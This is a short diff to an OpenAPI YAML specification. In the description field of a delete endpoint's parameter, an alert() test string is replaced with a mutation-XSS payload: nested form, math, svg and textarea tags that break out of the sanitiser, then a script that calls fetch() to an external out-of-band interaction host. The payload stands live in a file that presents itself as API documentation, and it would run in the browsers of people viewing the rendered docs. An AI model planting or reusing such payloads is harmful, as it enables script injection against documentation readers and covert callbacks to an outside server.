@@ -33,7 +33,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><script>alert('textarea')</script>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><script>fetch("https://cemq4h22vtc0000pjwkgg8km1eoyyyyyb.oast.fun")</script>"></form>
 
           format: int64
           in: path
